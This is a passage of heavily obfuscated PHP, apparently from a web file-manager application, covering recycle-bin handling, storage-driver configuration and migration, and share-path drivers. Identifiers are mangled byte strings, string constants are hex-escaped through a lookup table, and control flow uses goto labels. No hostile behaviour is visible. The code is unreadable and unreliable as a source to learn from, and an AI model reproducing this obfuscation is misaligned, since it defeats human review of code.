($´â¹æÁ[$İê±æÀ¨[33]] == $İê±æÀ¨[557] && isset($´â¹æÁ[$İê±æÀ¨[453]][$İê±æÀ¨[1165]])) { $´â¹æÁ[$İê±æÀ¨[453]][$İê±æÀ¨[1165]] = $¦³Ç¯¦Ó[$´â¹æÁ[$İê±æÀ¨[453]][$İê±æÀ¨[1165]]]; $´â¹æÁ[$İê±æÀ¨[453]][$İê±æÀ¨[1166]] = $¦³Ç¯¦Ó[$´â¹æÁ[$İê±æÀ¨[453]][$İê±æÀ¨[1166]]]; } if ($´â¹æÁ[$İê±æÀ¨[33]] == $İê±æÀ¨[2067] && isset($´â¹æÁ[$İê±æÀ¨[453]][$İê±æÀ¨[402]])) { $´â¹æÁ[$İê±æÀ¨[453]][$İê±æÀ¨[402]] = $¦³Ç¯¦Ó[$´â¹æÁ[$İê±æÀ¨[453]][$İê±æÀ¨[402]]]; } $´â¹æÁ[$İê±æÀ¨[86]] = $¦³Ç¯¦Ó[$´â¹æÁ[$İê±æÀ¨[402]]]; $´â¹æÁ[$İê±æÀ¨[2072]] = $¦³Ç¯¦Ó[$´â¹æÁ[$İê±æÀ¨[2057]]]; if ($´â¹æÁ[$İê±æÀ¨[33]] == $İê±æÀ¨[1803]) { $´â¹æÁ[$İê±æÀ¨[2072]] = $´â¹æÁ[$İê±æÀ¨[86]]; $´â¹æÁ[$İê±æÀ¨[2057]] = $´â¹æÁ[$İê±æÀ¨[2072]][$İê±æÀ¨[402]]; $´â¹æÁ[$İê±æÀ¨[86]] = !1; $´â¹æÁ[$İê±æÀ¨[402]] = $İê±æÀ¨[12]; } $´â¹æÁ[$İê±æÀ¨[2002]] = $•ÈíÔÍ[$´â¹æÁ[$İê±æÀ¨[1662]]]; } unset($´â¹æÁ); $›£ãë¿Ô[$İê±æÀ¨[369]] = $ğ§×¢…Ê; return $›£ãë¿Ô; } public function removeBySource($¦Å„›Ä) { $™ÄæÈ¼¦ = array($_SERVER[ÏéâËõ‘][417] => $¦Å„›Ä); $this->where($™ÄæÈ¼¦)->remove(); } } goto B¡Õƒ„‰‚; DÍğõÔ°­†: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\162\143\145\137\162\x65\x63\x79\x63\x6c\x65"; protected $dataAuto = array(array("\143\x72\x65\x61\164\x65\124\151\155\x65", "\164\151\x6d\x65", "\x69\156\x73\x65\162\164", "\146\x75\x6e\x63\x74\x69\157\x6e")); public function listData($¬Ö²¼—¹ = false) { $êÌÛóæ˜ =& $_SERVER[ÏéâËõ‘]; $¬Ö²¼—¹ = $¬Ö²¼—¹ ? $¬Ö²¼—¹ : USER_ID; $ÄÂò‚É± = $this->where(array($êÌÛóæ˜[1653] => $¬Ö²¼—¹))->select(); return array_to_keyvalue($ÄÂò‚É±, $êÌÛóæ˜[12], $êÌÛóæ˜[402]); } public function moveToRecycle($ğ°•ù÷) { $ÊƒÕìğé =& $_SERVER[ÏéâËõ‘]; $³´ÄöêÄ = Model($ÊƒÕìğé[1332]); $ÁãôÏŸ‰ = $³´ÄöêÄ->sourceInfo($ğ°•ù÷); if (!$ÁãôÏŸ‰ || $ÁãôÏŸ‰[$ÊƒÕìğé[431]] == $ÊƒÕìğé[88]) { return; } $ïİÀ˜ó = array($ÊƒÕìğé[417] => $ğ°•ù÷, $ÊƒÕìğé[1653] => USER_ID, $ÊƒÕìğé[586] => $ÁãôÏŸ‰[$ÊƒÕìğé[411]], $ÊƒÕìğé[587] => $ÁãôÏŸ‰[$ÊƒÕìğé[505]], $ÊƒÕìğé[590] => $ÁãôÏŸ‰[$ÊƒÕìğé[521]]); $this->add($ïİÀ˜ó); $this->recycleMove($ğ°•ù÷, 1); if ($ÁãôÏŸ‰[$ÊƒÕìğé[410]] == $ÊƒÕìğé[88]) { $•ÃéÊÂ« = array($ÊƒÕìğé[590] => array($ÊƒÕìğé[550], $ÁãôÏŸ‰[$ÊƒÕìğé[521]] . $ğ°•ù÷ . $ÊƒÕìğé[551])); $³´ÄöêÄ->where($•ÃéÊÂ«)->setField($ÊƒÕìğé[431], 1); } } public function clear() { $this->remove(!1); } public function remove($Ã¡À×€ = false, $Ê˜îÚ‹´ = false) { $¬¹›ú± =& $_SERVER[ÏéâËõ‘]; $Ê˜îÚ‹´ = $Ê˜îÚ‹´ ? $Ê˜îÚ‹´ : USER_ID; $ıÀöá•Ş = Model($¬¹›ú±[1332]); $§£º½»‚ = $this->listData($Ê˜îÚ‹´); $Ã¡À×€ = $Ã¡À×€ === !1 ? !1 : $Ã¡À×€; $¾·õ˜‰„ = array(); foreach ($§£º½»‚ as $Îò–õô) { if ($Ã¡À×€ != !1 && !in_array($Îò–õô, $Ã¡À×€)) { continue; } $ğ·†ê«õ = $ıÀöá•Ş->sourceInfo($Îò–õô); $ıÀöá•Ş->remove($Îò–õô, !1); $ô¨†Ñå§ = $ğ·†ê«õ[$¬¹›ú±[411]] . $¬¹›ú±[11] . $ğ·†ê«õ[$¬¹›ú±[505]]; $¾·õ˜‰„[$ô¨†Ñå§] = array($¬¹›ú±[586] => $ğ·†ê«õ[$¬¹›ú±[411]], $¬¹›ú±[505] => $ğ·†ê«õ[$¬¹›ú±[505]]); $this->where(array($¬¹›ú±[402] => $Îò–õô))->delete(); } foreach ($¾·õ˜‰„ as $ìÂş®ù×) { $ıÀöá•Ş->targetSpaceUpdate($ìÂş®ù×[$¬¹›ú±[411]], $ìÂş®ù×[$¬¹›ú±[505]]); } } public function restore($¡³²»ı¬ = false) { $³×âÖ”ø = $this->listData(); $this->_restoreSource($³×âÖ”ø, $¡³²»ı¬); } public function removeUserAll($´÷¡·ŠÉ) { $this->remove(!1, $´÷¡·ŠÉ); } private function _restoreSource($ş‡±–Èé, $—”ğ¬ñÆ) { $÷µıß´Í =& $_SERVER[ÏéâËõ‘]; $¾Á¯Ä®Æ = Model($÷µıß´Í[1332]); $—”ğ¬ñÆ = $—”ğ¬ñÆ == !1 ? !1 : $—”ğ¬ñÆ; if (!$ş‡±–Èé) { return !0; } $ÈÂÑ»ËÂ = array(); foreach ($ş‡±–Èé as $İñˆ…´) { if ($—”ğ¬ñÆ != !1 && !in_array($İñˆ…´, $—”ğ¬ñÆ)) { continue; } $¼´ü“¯¯ = $¾Á¯Ä®Æ->sourceInfo($İñˆ…´); $Ö…áÓ¹Ä = $¾Á¯Ä®Æ->sourceInfo($¼´ü“¯¯[$÷µıß´Í[432]]); if ($Ö…áÓ¹Ä[$÷µıß´Í[431]] == $÷µıß´Í[88]) { continue; } $¾Á¯Ä®Æ->lockMoveStart($İñˆ…´); $this->recycleMove($İñˆ…´, 0); if ($¼´ü“¯¯[$÷µıß´Í[410]] == $÷µıß´Í[88]) { $Œ‘•¦­ = array($÷µıß´Í[590] => array($÷µıß´Í[550], $¼´ü“¯¯[$÷µıß´Í[521]] . $İñˆ…´ . $÷µıß´Í[551])); $¾Á¯Ä®Æ->where($Œ‘•¦­)->setField($÷µıß´Í[431], 0); $this->restoreFolderChildren($İñˆ…´, $ş‡±–Èé); } $this->where(array($÷µıß´Í[402] => $İñˆ…´))->delete(); $¾Á¯Ä®Æ->folderSizeReset($¼´ü“¯¯[$÷µıß´Í[432]]); $ÈÂÑ»ËÂ[] = $¼´ü“¯¯[$÷µıß´Í[432]]; if ($¼´ü“¯¯[$÷µıß´Í[410]] == $÷µıß´Í[88]) { $ÈÂÑ»ËÂ[] = $İñˆ…´; } $¾Á¯Ä®Æ->lockMoveEnd($İñˆ…´); } $¾Á¯Ä®Æ->updateModifyTime($ÈÂÑ»ËÂ); } private function restoreFolderChildren($…ì­‡ÚŒ, $Ñ÷§ğ®) { $ÍûãÃÛ =& $_SERVER[ÏéâËõ‘]; $‰ªÔ¿„– = Model($ÍûãÃÛ[1332]); $Õ‚ªÏ…‰ = array($ÍûãÃÛ[402] => array($ÍûãÃÛ[7], array())); foreach ($Ñ÷§ğ® as $‡İŠ«Œ÷) { if ($‡İŠ«Œ÷ == $…ì­‡ÚŒ) { continue; } if (!$‰ªÔ¿„–->isParentOf($…ì­‡ÚŒ, $‡İŠ«Œ÷)) { continue; } $ÊÈœ¥ôó = $‰ªÔ¿„–->sourceInfo($‡İŠ«Œ÷); if ($ÊÈœ¥ôó[$ÍûãÃÛ[410]] == $ÍûãÃÛ[88]) { $Õ‚ªÏ…‰[] = array($ÍûãÃÛ[590] => array($ÍûãÃÛ[550], $ÊÈœ¥ôó[$ÍûãÃÛ[521]] . $‡İŠ«Œ÷ . $ÍûãÃÛ[551])); } else { $Õ‚ªÏ…‰[$ÍûãÃÛ[402]][1][] = $‡İŠ«Œ÷; } } if (!$Õ‚ªÏ…‰[$ÍûãÃÛ[402]][1]) { unset($Õ‚ªÏ…‰[$ÍûãÃÛ[402]]); } if (!$Õ‚ªÏ…‰) { return; } $Õ‚ªÏ…‰[$ÍûãÃÛ[402]][1] = array_unique($Õ‚ªÏ…‰[$ÍûãÃÛ[402]][1]); $Õ‚ªÏ…‰[$ÍûãÃÛ[1005]] = $ÍûãÃÛ[1932]; $‰ªÔ¿„–->where($Õ‚ªÏ…‰)->setField($ÍûãÃÛ[431], 1); } private function recycleMove($ÙûöìƒÛ, $£úÃ²ì¦ = 1) { $ã±«èÚŸ =& $_SERVER[ÏéâËõ‘]; $¢½¿åÈ = Model($ã±«èÚŸ[1332]); $¢ş¤¼Ì = Model($ã±«èÚŸ[2143]); $û¿¾°´ = array($ã±«èÚŸ[402] => $ÙûöìƒÛ); if ($£úÃ²ì¦) { $¢½¿åÈ->where($û¿¾°´)->setField($ã±«èÚŸ[431], 1); $¢ş¤¼Ì->eventRecycle($ÙûöìƒÛ, $ã±«èÚŸ[2144]); } else { $›İ¹³Îˆ = $¢½¿åÈ->where($û¿¾°´)->find(); $çáäÜ = $›İ¹³Îˆ[$ã±«èÚŸ[410]] == $ã±«èÚŸ[88]; $”±¡ºÜÖ = $¢½¿åÈ->fileNameAuto($›İ¹³Îˆ[$ã±«èÚŸ[432]], $›İ¹³Îˆ[$ã±«èÚŸ[32]], REPEAT_RENAME_FOLDER, $çáäÜ); if ($”±¡ºÜÖ != $›İ¹³Îˆ[$ã±«èÚŸ[32]]) { $¢½¿åÈ->rename($ÙûöìƒÛ, $”±¡ºÜÖ); } $¢½¿åÈ->where($û¿¾°´)->setField($ã±«èÚŸ[431], 0); $¢ş¤¼Ì->eventRecycle($ÙûöìƒÛ, $ã±«èÚŸ[2145]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\x2e\x73\x6f\x75\x72\x63\x65\123\145\143\x72\145\164\x4c\x69\163\164"; public $field = array("\163\157\165\162\143\x65\x49\104", "\x74\171\160\x65\111\104", "\x63\x72\145\141\164\145\x55\163\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\56\163\164\x6f\x72\x61\x67\145\114\151\163\164"; public $field = array("\x6e\141\x6d\x65", "\163\x69\172\x65\x4d\141\x78", "\x73\171\163\x74\x65\x6d", "\144\x65\x66\141\x75\x6c\x74", "\x64\x72\151\x76\x65\162", "\143\x6f\156\146\151\147"); public function listData($“ø´ôåâ = false, $ŠªóÀÌ™ = "\155\x6f\x64\151\x66\x79\124\x69\155\145", $È‘Ÿºßì = false) { $°ô¶­ó· =& $_SERVER[ÏéâËõ‘]; $šñîëÀç = parent::listData($“ø´ôåâ, $ŠªóÀÌ™, $È‘Ÿºßì); if ($“ø´ôåâ) { return $šñîëÀç; } $‰ùä‰á = $this->ioSizeUseGet(array_to_keyvalue($šñîëÀç, $°ô¶­ó·[12], $°ô¶­ó·[399])); foreach ($šñîëÀç as $öÙÂ¦• => $¨¥Ï½®) { unset($šñîëÀç[$öÙÂ¦•][$°ô¶­ó·[6]]); $šñîëÀç[$öÙÂ¦•][$°ô¶­ó·[1823]] = isset($‰ùä‰á[$¨¥Ï½®[$°ô¶­ó·[399]]]) ? $‰ùä‰á[$¨¥Ï½®[$°ô¶­ó·[399]]] : 0; } return $šñîëÀç; } public function ioSizeUseGet($Ê¬ áÒ) { $¦êíä”É =& $_SERVER[ÏéâËõ‘]; if (!$Ê¬ áÒ) { return array(); } $Ğñı†‚ = $¦êíä”É[2146] . implode($¦êíä”É[50], $Ê¬ áÒ); $§Ñà“åô = Cache::get($Ğñı†‚); if ($§Ñà“åô) { return $§Ñà“åô; } $ÙÜßƒ‡Ù = array($¦êíä”É[819] => $¦êíä”É[399], $¦êíä”É[2147] => $¦êíä”É[76]); $Ñ×¹’ÄÖ = array($¦êíä”É[819] => array($¦êíä”É[7], $Ê¬ áÒ)); $§Ñà“åô = Model($¦êíä”É[791])->field($ÙÜßƒ‡Ù)->where($Ñ×¹’ÄÖ)->group($¦êíä”É[819])->select(); $§Ñà“åô = array_to_keyvalue($§Ñà“åô, $¦êíä”É[399], $¦êíä”É[76]); Cache::set($Ğñı†‚, $§Ñà“åô, 600); return $§Ñà“åô; } public function getConfig($Ø¯–Ã›ó) { $®Ëå‰ÒÚ = parent::listData($Ø¯–Ã›ó); return json_decode($®Ëå‰ÒÚ[$_SERVER[ÏéâËõ‘][6]], !0); } public function update($Œ¶ÎåÎå, $ô´íÓãö) { $¸ªøœÑ¥ =& $_SERVER[ÏéâËõ‘]; $šüÍë” = $ô´íÓãö[$¸ªøœÑ¥[32]]; $‹ÊÕŒµ = array_to_keyvalue(parent::listData(), $¸ªøœÑ¥[32]); if (isset($‹ÊÕŒµ[$šüÍë”]) && $‹ÊÕŒµ[$šüÍë”][$¸ªøœÑ¥[399]] != $Œ¶ÎåÎå) { return !1; } $this->checkPwd($Œ¶ÎåÎå, $ô´íÓãö); if (isset($ô´íÓãö[$¸ªøœÑ¥[2148]]) && $ô´íÓãö[$¸ªøœÑ¥[2148]] == $¸ªøœÑ¥[88]) { $this->checkConfig($ô´íÓãö); } unset($ô´íÓãö[$¸ªøœÑ¥[2148]]); $„È£´³ = parent::update($Œ¶ÎåÎå, $ô´íÓãö); if ($„È£´³ && $ô´íÓãö[$¸ªøœÑ¥[37]]) { $³„€ñŸ = 0; foreach ($‹ÊÕŒµ as $ÔÏ¥Æô…) { if ($ÔÏ¥Æô…[$¸ªøœÑ¥[37]] && $ÔÏ¥Æô…[$¸ªøœÑ¥[399]] != $Œ¶ÎåÎå) { $³„€ñŸ = $ÔÏ¥Æô…[$¸ªøœÑ¥[399]]; parent::update($ÔÏ¥Æô…[$¸ªøœÑ¥[399]], array($¸ªøœÑ¥[37] => 0)); } } $this->updateBackup($Œ¶ÎåÎå, $³„€ñŸ); } return $„È£´³; } public function add($ü›î½¢ï) { $ı˜ñç¸î =& $_SERVER[ÏéâËõ‘]; $ŸíÓ©Ë‘ = array_to_keyvalue(parent::listData(), $ı˜ñç¸î[32]); if (isset($ŸíÓ©Ë‘[$ü›î½¢ï[$ı˜ñç¸î[32]]])) { return !1; } $this->checkConfig($ü›î½¢ï); $®¹Ú×›È = parent::insert($ü›î½¢ï); if ($®¹Ú×›È && $ü›î½¢ï[$ı˜ñç¸î[37]]) { foreach ($ŸíÓ©Ë‘ as $¡…‚­ªÁ) { if ($¡…‚­ªÁ[$ı˜ñç¸î[37]]) { parent::update($¡…‚­ªÁ[$ı˜ñç¸î[399]], array($ı˜ñç¸î[37] => 0)); } } } return $®¹Ú×›È; } public function updateBackup($—¦Ì–è, $¿”»†Š) { $†–äºÎ =& $_SERVER[ÏéâËõ‘]; if (!$¿”»†Š) { return; } $Á¢ˆßšÏ = Model($†–äºÎ[751])->config(); if ($Á¢ˆßšÏ[$†–äºÎ[1632]] != $†–äºÎ[88] || $Á¢ˆßšÏ[$†–äºÎ[754]] != $¿”»†Š) { return; } $“Ô¶¹¥ô = Model($†–äºÎ[772])->get($†–äºÎ[782]); $“Ô¶¹¥ô = json_decode($“Ô¶¹¥ô, !0); if (!$“Ô¶¹¥ô) { return; } $“Ô¶¹¥ô[$†–äºÎ[754]] = $—¦Ì–è; Model($†–äºÎ[772])->set(array($†–äºÎ[782] => $“Ô¶¹¥ô)); } public function checkPwd($Èí®œËà, &$è©ÅùŒŒ) { $ÃİÅæÜ =& $_SERVER[ÏéâËõ‘]; if (empty($è©ÅùŒŒ[$ÃİÅæÜ[6]])) { return; } $‹áÏºë = json_decode($è©ÅùŒŒ[$ÃİÅæÜ[6]], !0); $¡ÚƒÃî– = $ÃİÅæÜ[12]; $Ã§æĞœŒ = array($ÃİÅæÜ[2149], $ÃİÅæÜ[2150], $ÃİÅæÜ[894]); foreach ($Ã§æĞœŒ as $è«»÷ì¶) { if (isset($‹áÏºë[$è«»÷ì¶])) { $¡ÚƒÃî– = $è«»÷ì¶; break; } } if (!$¡ÚƒÃî–) { return; } $ß˜ŞĞÓ = $this->getConfig($Èí®œËà); $í˜×¤ª = $ß˜ŞĞÓ[$¡ÚƒÃî–]; $Í ŞÁ³ = $‹áÏºë[$¡ÚƒÃî–]; if ($Í ŞÁ³ == str_repeat($ÃİÅæÜ[188], strlen($í˜×¤ª))) { $‹áÏºë[$¡ÚƒÃî–] = $í˜×¤ª; $è©ÅùŒŒ[$ÃİÅæÜ[6]] = json_encode($‹áÏºë); } else { if ($Í ŞÁ³ != $í˜×¤ª) { $è©ÅùŒŒ[$ÃİÅæÜ[2148]] = $ÃİÅæÜ[88]; } } } public function checkConfig(&$·Æ„æŞ€, $óó‰÷òû = false) { $òúÑïÇŸ =& $_SERVER[ÏéâËõ‘]; $˜û°“ğ = strtolower($·Æ„æŞ€[$òúÑïÇŸ[95]]); $ñ‹Ÿ‡êµ = json_decode($·Æ„æŞ€[$òúÑïÇŸ[6]], !0); foreach ($ñ‹Ÿ‡êµ as $ÀÜ˜©ª => $ªåùàµ) { $ñ‹Ÿ‡êµ[$ÀÜ˜©ª] = trim($ªåùàµ); } $ñ‹Ÿ‡êµ[$òúÑïÇŸ[2151]] = rand_string(6); $½˜½ƒš• = $GLOBALS[$òúÑïÇŸ[6]][$òúÑïÇŸ[89]][$òúÑïÇŸ[828]]; $Ö±û‘Ë = isset($½˜½ƒš•[$˜û°“ğ]) ? $½˜½ƒš•[$˜û°“ğ] : ucfirst($˜û°“ğ); $¢ÂÚ½­œ = $òúÑïÇŸ[74] . $Ö±û‘Ë; if (!$Ö±û‘Ë || !class_exists($¢ÂÚ½­œ)) { if ($óó‰÷òû) { return LNG($òúÑïÇŸ[2152]); } write_log(array($òúÑïÇŸ[2153], $·Æ„æŞ€, get_caller_info()), $òúÑïÇŸ[2154]); show_json(LNG($òúÑïÇŸ[2152]), !1, $·Æ„æŞ€); } $Ù’»ƒÜˆ = new $¢ÂÚ½­œ($ñ‹Ÿ‡êµ); if (in_array($˜û°“ğ, $Ù’»ƒÜˆ->objectDriver)) { if (!$Ù’»ƒÜˆ->isBucketCors() && !$Ù’»ƒÜˆ->setBucketCors()) { $´°±»ùÈ = LNG($òúÑïÇŸ[2155]); $´°±»ùÈ .= $òúÑïÇŸ[2156] . LNG($òúÑïÇŸ[2157]); if ($óó‰÷òû) { return $´°±»ùÈ; } show_json($´°±»ùÈ, !1); } } $—¤÷ŒÃ± = rtrim($ñ‹Ÿ‡êµ[$òúÑïÇŸ[1186]], $òúÑïÇŸ[8]) . $òúÑïÇŸ[8]; $˜é®É¹ï = $Ù’»ƒÜˆ->getPath($—¤÷ŒÃ± . $òúÑïÇŸ[1248]); if (!$Ù’»ƒÜˆ->mkfile($˜é®É¹ï)) { if ($óó‰÷òû) { return LNG($òúÑïÇŸ[2155]); } show_json(LNG($òúÑïÇŸ[2155]), !1); } $ñ‹Ÿ‡êµ[$òúÑïÇŸ[1186]] = $—¤÷ŒÃ±; $·Æ„æŞ€[$òúÑïÇŸ[6]] = json_encode($ñ‹Ÿ‡êµ); $·Æ„æŞ€[$òúÑïÇŸ[95]] = $Ö±û‘Ë; return !0; } public function driverListSystem() { $ÊøÔª÷ =& $_SERVER[ÏéâËõ‘]; $¤ğŠ™ÄŸ = parent::listData(); $Õ¥ÂÕÔ÷ = array(); foreach ($¤ğŠ™ÄŸ as $Šü—†¦ò) { unset($Šü—†¦ò[$ÊøÔª÷[200]], $Šü—†¦ò[$ÊøÔª÷[85]]); $Šü—†¦ò[$ÊøÔª÷[6]] = json_decode($Šü—†¦ò[$ÊøÔª÷[6]], !0); $Õ¥ÂÕÔ÷[] = $Šü—†¦ò; } return $Õ¥ÂÕÔ÷; } public function defaultDriver() { $’ê“±¿‹ =& $_SERVER[ÏéâËõ‘]; $¯ÆÏèØí = parent::listData(); $…ëÕ¼£ = array_filter_by_field($¯ÆÏèØí, $’ê“±¿‹[37], 1); $…ëÕ¼£ = $…ëÕ¼£[0]; if ($…ëÕ¼£) { $…ëÕ¼£[$’ê“±¿‹[6]] = json_decode($…ëÕ¼£[$’ê“±¿‹[6]], !0); } return $…ëÕ¼£; } public function driverInfo($©â¹Ë—) { $¾ù¡œÑş =& $_SERVER[ÏéâËõ‘]; $õü¦Š ü = array_to_keyvalue(parent::listData(), $¾ù¡œÑş[399]); if (!isset($õü¦Š ü[$©â¹Ë—])) { return !1; } $İŒğ±Ğ— = $õü¦Š ü[$©â¹Ë—]; $İŒğ±Ğ—[$¾ù¡œÑş[6]] = json_decode($İŒğ±Ğ—[$¾ù¡œÑş[6]], !0); return $İŒğ±Ğ—; } public function remove($Åßç¹) { $this->removeShareItems($Åßç¹); return parent::remove($Åßç¹); } public function removeWithFile($›Ó­ŸĞ, $šûÎ©´Ü) { $Ù£»ÖÑÏ =& $_SERVER[ÏéâËõ‘]; $’û‡¨³ª = array($Ù£»ÖÑÏ[819] => $›Ó­ŸĞ); $Øš¤òù = Model($Ù£»ÖÑÏ[471])->where($’û‡¨³ª)->count(); $“ªáÄé­ = Model($Ù£»ÖÑÏ[471])->where($’û‡¨³ª)->sum($Ù£»ÖÑÏ[76]); $äÃã÷Š• = $šûÎ©´Ü . $Ù£»ÖÑÏ[2158] . $›Ó­ŸĞ; $æ±ûæ¾Ä = LNG($šûÎ©´Ü == $Ù£»ÖÑÏ[557] ? $Ù£»ÖÑÏ[2159] : $Ù£»ÖÑÏ[2160]); $¯òéËİ = new TaskFileTransfer($äÃã÷Š•, $Ù£»ÖÑÏ[2154], $Øš¤òù, $æ±ûæ¾Ä . "\x28{$›Ó­ŸĞ}\51"); $¯òéËİ->task[$Ù£»ÖÑÏ[765]] = (double) $“ªáÄé­; $±­ª¦Ö = KodIO::defaultDriver(); $›…Æ–Ã× = $±­ª¦Ö[$Ù£»ÖÑÏ[399]]; $šŒÃ£à¬ = "\173\151\x6f\x3a{$›…Æ–Ã×}\x7d\57"; $óÁ×–˜¢ = !0; $şÉâ¼¨ƒ = array(); $»Û²êèè = Model($Ù£»ÖÑÏ[199])->where($’û‡¨³ª)->field($Ù£»ÖÑÏ[2161])->select(); foreach ($»Û²êèè as $¦¶âµÙó) { $£Üß÷â€ = $¦¶âµÙó[$Ù£»ÖÑÏ[84]]; $”°Ü ± = $šŒÃ£à¬ . str_replace("\173\x69\157\72{$›Ó­ŸĞ}\x7d\x2f", $Ù£»ÖÑÏ[12], $£Üß÷â€); if (!IO::exist($£Üß÷â€)) { $şÉâ¼¨ƒ[] = $¦¶âµÙó[$Ù£»ÖÑÏ[468]]; $¯òéËİ->updateFileEnd($¦¶âµÙó[$Ù£»ÖÑÏ[32]], $¦¶âµÙó[$Ù£»ÖÑÏ[76]]); continue; } if (IO::exist($”°Ü ±)) { $¯òéËİ->updateFileEnd($¦¶âµÙó[$Ù£»ÖÑÏ[32]], $¦¶âµÙó[$Ù£»ÖÑÏ[76]]); continue; } if (!IO::move($£Üß÷â€, get_path_father($”°Ü ±))) { $óÁ×–˜¢ = !1; break; } $’û‡¨³ª = array($Ù£»ÖÑÏ[468] => $¦¶âµÙó[$Ù£»ÖÑÏ[468]]); $àŞ­½û = array($Ù£»ÖÑÏ[819] => $›…Æ–Ã×, $Ù£»ÖÑÏ[84] => $”°Ü ±); Model($Ù£»ÖÑÏ[199])->where($’û‡¨³ª)->save($àŞ­½û); } $this->removeByFileID($şÉâ¼¨ƒ); if (!$óÁ×–˜¢) { $¯òéËİ->stop($äÃã÷Š•); return !1; } $¯òéËİ->end(); if ($šûÎ©´Ü == $Ù£»ÖÑÏ[1803]) { $this->remove($›Ó­ŸĞ); } } public function progress($Æ“éëâğ, $ºÉ âÚ) { return Task::get($ºÉ âÚ . $_SERVER[ÏéâËõ‘][2158] . $Æ“éëâğ); } private function removeByFileID($î¦¡áÒÉ = array()) { $«›Æ¯ä =& $_SERVER[ÏéâËõ‘]; if (empty($î¦¡áÒÉ)) { return; } $¯–ş÷¹› = array($«›Æ¯ä[468] => array($«›Æ¯ä[7], $î¦¡áÒÉ)); $…ÁÒ¼Ã• = Model($«›Æ¯ä[1332])->where($¯–ş÷¹›)->field($«›Æ¯ä[402])->select(); if (!$…ÁÒ¼Ã•) { return; } $…ÁÒ¼Ã• = array_to_keyvalue($…ÁÒ¼Ã•, $«›Æ¯ä[12], $«›Æ¯ä[402]); foreach ($…ÁÒ¼Ã• as $Î…Ôè§) { Model($«›Æ¯ä[416])->removeNow($Î…Ôè§, !1); } } private function removeShareItems($Åì¨Î¾Ï) { $Ğ£ˆË¿ =& $_SERVER[ÏéâËõ‘]; $ÙˆÊÚøÒ = "\x7b\x69\x6f\x3a{$Åì¨Î¾Ï}\175\x2f"; $Úì§ûú• = array($Ğ£ˆË¿[402] => 0, $Ğ£ˆË¿[1181] => array($Ğ£ˆË¿[383], "{$ÙˆÊÚøÒ}\x25")); $œ…“ª = Model($Ğ£ˆË¿[1814])->where($Úì§ûú•)->field($Ğ£ˆË¿[489])->select(); if (empty($œ…“ª)) { return; } $œŞå¸¦© = array_to_keyvalue($œ…“ª, $Ğ£ˆË¿[12], $Ğ£ˆË¿[489]); Model($Ğ£ˆË¿[601])->remove($œŞå¸¦©); } } goto cî¥Û—£Ş“; B¤Îæ¿¡Äİ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($˜Éõ†—Á) { $this->pathParse = $˜Éõ†—Á; $this->model = Model($_SERVER[ÏéâËõ‘][1332]); } public function getPathOuter($è¾á¹”) { $€ŠÉ£Àş =& $_SERVER[ÏéâËõ‘]; if (!$è¾á¹”) { return $è¾á¹”; } $ö¹†¸Á¼ = $this->parse($è¾á¹”); return trim(KodIO::makeShare($this->pathParse[$€ŠÉ£Àş[399]], $ö¹†¸Á¼[$€ŠÉ£Àş[399]]), $€ŠÉ£Àş[8]); } protected function infoParse($ÃèœË‰‡, $Íê˜Ñ› = false, $ıéîÓ°Ø = false) { $ù•¥¶‹ò =& $_SERVER[ÏéâËõ‘]; $Í†Ë˜ùá = $this->pathParse[$ù•¥¶‹ò[399]]; $Õëâúæ¶ = trim($this->pathParse[$ù•¥¶‹ò[1174]], $ù•¥¶‹ò[8]); return Action($ù•¥¶‹ò[1340])->sharePathInfo($Í†Ë˜ùá, $Õëâúæ¶, $Íê˜Ñ›); } public function infoFull($Ì½Àûı) { $‡‘ù¡ =& $_SERVER[ÏéâËõ‘]; $¾í›ÑØ = explode($‡‘ù¡[8], trim($Ì½Àûı, $‡‘ù¡[8])); if (count($¾í›ÑØ) > 1) { $°Ò¾¥Ò« = implode($‡‘ù¡[8], array_splice($¾í›ÑØ, 1)); $ßÁæîı = $this->model->pathInfoByPath($¾í›ÑØ[0], $°Ò¾¥Ò«); if (!$ßÁæîı) { return !1; } $this->pathParse[$‡‘ù¡[1174]] = $ßÁæîı[$‡‘ù¡[402]]; } return $this->infoParse($Ì½Àûı); } public function listAll($áÇ—š–ô) { $å”ñÇ©Ö =& $_SERVER[ÏéâËõ‘]; $³øñÌùî = IO::info($this->pathParse[$å”ñÇ©Ö[84]]); if (!$³øñÌùî) { return array(); } $ØÜØÀµÚ = $this->model->listAll($áÇ—š–ô); $°œ­‡¨ = Model($å”ñÇ©Ö[601])->getInfo($³øñÌùî[$å”ñÇ©Ö[489]]); $“ÌÃú³ã = Action($å”ñÇ©Ö[1340]); foreach ($ØÜØÀµÚ as &$Ëëş§©») { check_abort(); $Ëëş§©»[$å”ñÇ©Ö[86]] = $“ÌÃú³ã->_shareItemeParse($Ëëş§©»[$å”ñÇ©Ö[86]], $°œ­‡¨); } unset($Ëëş§©»); return $ØÜØÀµÚ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÍÖÁîæ) { $this->pathParse = $ÍÖÁîæ; $this->model = Model($_SERVER[ÏéâËõ‘][1332]); } protected function infoParse($ïêÂúˆû, $‹ÂïÊ = false, $Î¨úçÜÉ = false) { $ß¡îà½® =& $_SERVER[ÏéâËõ‘]; return Action($ß¡îà½®[1180])->sharePathInfo($this->pathParse[$ß¡îà½®[84]], !0, $‹ÂïÊ); } public function listPath($çª¤ÒÎŠ, $Å„ñôÁ® = false) { $åÑÒÛè =& $_SERVER[ÏéâËõ‘]; $»‘ß‘Õ = parent::listPath($çª¤ÒÎŠ, $Å„ñôÁ®); if (!$»‘ß‘Õ) { return $»‘ß‘Õ; } if (is_array($»‘ß‘Õ[$åÑÒÛè[1341]])) { $»‘ß‘Õ[$åÑÒÛè[1341]] = Action($åÑÒÛè[1180])->shareItemInfo($»‘ß‘Õ[$åÑÒÛè[1341]]); } foreach ($»‘ß‘Õ as $€÷ĞƒºÁ => $äøğ‚¾¸) { if (!in_array($€÷ĞƒºÁ, array($åÑÒÛè[83], $åÑÒÛè[82]))) { continue; } foreach ($äøğ‚¾¸ as $Â‹”¿ÖÔ => $–¦ØÙó³) { $»‘ß‘Õ[$€÷ĞƒºÁ][$Â‹”¿ÖÔ] = Action($åÑÒÛè[1180])->shareItemInfo($–¦ØÙó³); } } return $»‘ß‘Õ; } public function listAll($‰Ã¦Š¶) { $”ÜİÃ¾Ù =& 